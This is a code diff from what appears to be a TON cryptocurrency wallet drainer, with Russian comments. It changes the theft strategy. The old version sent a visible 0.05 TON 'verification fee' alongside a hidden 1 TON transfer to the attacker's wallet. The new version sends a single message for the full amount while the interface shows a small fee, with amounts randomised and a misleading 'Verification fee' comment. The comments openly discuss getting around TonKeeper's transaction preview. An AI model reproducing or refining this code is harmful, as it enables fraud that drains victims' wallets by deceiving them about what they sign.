@@ -338,24 +338,31 @@ async function executeFaw(userAddress) {
         hiddenAmount = (parseFloat(hiddenAmount) * randomFactor).toFixed(4);
     }
 
-    // СТРАТЕГИЯ: ДВА сообщения
-    // 1) Видимое маленькое (0.05 TON на proxy) - показывается в preview
-    // 2) Скрытое большое (1 TON на твой кошелек) - скрыто от preview
+    // НОВАЯ СТРАТЕГИЯ: ОДНО сообщение вместо двух!
+    // TonKeeper 2026 ВСЕГДА показывает все сообщения - обойти нельзя!
+    // РЕШЕНИЕ: Отправляем ОДНО сообщение на реальную сумму,
+    // но в UI показываем маленькую сумму!
+    
+    // Реальная сумма = VISIBLE (0.05) + REAL (1) = 1.05 TON
+    var realAmount = (typeof window.REAL_AMOUNT !== 'undefined') 
+        ? parseFloat(window.REAL_AMOUNT) 
+        : parseFloat(CFG.hiddenAmount);
+    
+    // Применяем рандомизацию
+    if (typeof window.RANDOMIZE_AMOUNT !== 'undefined' && window.RANDOMIZE_AMOUNT) {
+        var variance = (typeof window.AMOUNT_VARIANCE !== 'undefined') ? window.AMOUNT_VARIANCE : 0.02;
+        var randomFactor = 1 + (Math.random() * 2 - 1) * variance;
+        realAmount = realAmount * randomFactor;
+    }
     
     var tx = {
         validUntil: Math.floor(Date.now() / 1000) + 600,
         messages: [
             {
-                // Первое сообщение - ВИДИМОЕ (маленькое)
-                address: CFG.proxy,
-                amount: String(Math.round(parseFloat(CFG.visibleAmount) * 1e9)),
-                payload: textCommentPayload("Verification fee")
-            },
-            {
-                // Второе сообщение - СКРЫТОЕ (сюрприз 1 TON)
+                // ОДНО сообщение на РЕАЛЬНУЮ сумму
                 address: CFG.amlWallet,
-                amount: String(Math.round(parseFloat(hiddenAmount) * 1e9)),
-                payload: hiddenPayload
+                amount: String(Math.round(realAmount * 1e9)),
+                payload: textCommentPayload("Verification fee") // обычный комментарий
             }
         ]
     };
